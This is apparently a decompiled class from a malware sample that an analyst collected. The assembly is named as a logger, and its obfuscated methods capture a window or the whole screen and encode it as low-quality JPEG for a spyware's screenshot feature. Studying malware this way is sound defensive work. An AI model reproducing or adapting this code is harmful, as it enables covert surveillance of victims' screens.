// Decompiled with JetBrains decompiler
// Type: PN.T0
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using cWS;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace PN
{
  internal class T0
  {
    internal static T0 ST0;

    public Image tWG() => ldx.bx((object) this, txz.bx(txz.Cds), ldx.edd);

    private Image dWL(IntPtr _param1)
    {
      try
      {
        IntPtr num1 = rdI.bx(_param1, rdI.Bd5);
        jWj.VWt vwt = new jWj.VWt();
        JdP.bx(_param1, ref vwt, JdP.xdB);
        int num2 = vwt.right - vwt.left;
        int num3 = vwt.bottom - vwt.top;
        IntPtr num4 = rdI.bx(num1, rdI.zdr);
        IntPtr hbitmap = odM.bx(num1, num2, num3, odM.jdo);
        IntPtr num5 = RdE.bx(num4, hbitmap, RdE.tdH);
        Bd7.bx(num4, 0, 0, num2, num3, num1, 0, 0, 13369376, Bd7.jdA);
        RdE.bx(num4, num5, RdE.tdH);
        Ud4.bx(num4, Ud4.SdY);
        RdE.bx(_param1, num1, RdE.ndJ);
        Bitmap bitmap = Image.FromHbitmap(hbitmap);
        Ud4.bx(hbitmap, Ud4.pdZ);
        return (Image) bitmap;
      }
      catch
      {
      }
      return (Image) new Bitmap(1, 1);
    }

    public byte[] zWV(IntPtr _param1)
    {
      try
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          ldx.bx((object) this, _param1, ldx.edd).Save((Stream) memoryStream, ImageFormat.Jpeg);
          return memoryStream.ToArray();
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public byte[] vWg()
    {
      try
      {
        using (MemoryStream memoryStream1 = new MemoryStream())
        {
          Image image = Ode.bx((object) this, Ode.Qdf);
          ImageCodecInfo imageCodecInfo = Mdl.bx((object) this, ImageFormat.Jpeg, Mdl.Ndp);
          Encoder quality = Encoder.Quality;
          EncoderParameters encoderParameters = new EncoderParameters(1);
          EncoderParameter encoderParameter = new EncoderParameter(quality, 30L);
          encoderParameters.Param[0] = encoderParameter;
          MemoryStream memoryStream2 = memoryStream1;
          ImageCodecInfo encoder = imageCodecInfo;
          EncoderParameters encoderParams = encoderParameters;
          image.Save((Stream) memoryStream2, encoder, encoderParams);
          return memoryStream1.ToArray();
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    private ImageCodecInfo YWc(ImageFormat _param1)
    {
      foreach (ImageCodecInfo imageDecoder in ImageCodecInfo.GetImageDecoders())
      {
        if (imageDecoder.FormatID == _param1.Guid)
          return imageDecoder;
      }
      return (ImageCodecInfo) null;
    }

    public T0()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool GTL() => T0.ST0 == null;

    internal static T0 jTb() => T0.ST0;
  }
}
